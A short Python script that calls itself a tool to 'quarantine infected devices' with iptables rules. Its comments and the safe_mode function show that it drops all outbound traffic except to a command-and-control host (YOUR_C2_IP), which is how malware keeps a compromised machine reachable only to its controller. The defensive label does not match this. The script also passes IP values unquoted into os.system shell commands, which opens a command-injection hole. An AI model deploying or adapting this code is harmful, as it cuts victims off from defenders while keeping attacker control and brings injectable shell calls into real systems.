#!/usr/bin/env python3
# NETWORK ISOLATION - Quarantine infected devices
import os
import subprocess
import threading
import time

class NetworkIsolation:
    def __init__(self):
        self.isolated = set()
        self.original_rules = []
    
    def isolate_device(self, ip):
        """Isolate device from network"""
        if ip not in self.isolated:
            # Block all traffic from this IP except to C2
            os.system(f"iptables -A INPUT -s {ip} -j DROP 2>/dev/null")
            os.system(f"iptables -A OUTPUT -d {ip} -j DROP 2>/dev/null")
            self.isolated.add(ip)
            print(f"[+] Device {ip} isolated")
    
    def release_device(self, ip):
        """Release isolated device"""
        if ip in self.isolated:
            os.system(f"iptables -D INPUT -s {ip} -j DROP 2>/dev/null")
            os.system(f"iptables -D OUTPUT -d {ip} -j DROP 2>/dev/null")
            self.isolated.remove(ip)
            print(f"[-] Device {ip} released")
    
    def quarantine_mode(self):
        """Enable quarantine mode - block all except essential"""
        print("[*] Enabling quarantine mode...")
        # Block all incoming except established
        os.system("iptables -P INPUT DROP 2>/dev/null")
        os.system("iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT 2>/dev/null")
        # Allow localhost
        os.system("iptables -A INPUT -i lo -j ACCEPT 2>/dev/null")
        print("[+] Quarantine mode active")
    
    def safe_mode(self):
        """Safe mode - minimal connectivity"""
        print("[*] Enabling safe mode...")
        # Block everything except C2
        os.system("iptables -P OUTPUT DROP 2>/dev/null")
        os.system(f"iptables -A OUTPUT -d YOUR_C2_IP -j ACCEPT 2>/dev/null")
        print("[+] Safe mode active")

if __name__ == "__main__":
    ni = NetworkIsolation()
    ni.isolate_device("192.168.1.100")
    ni.quarantine_mode()
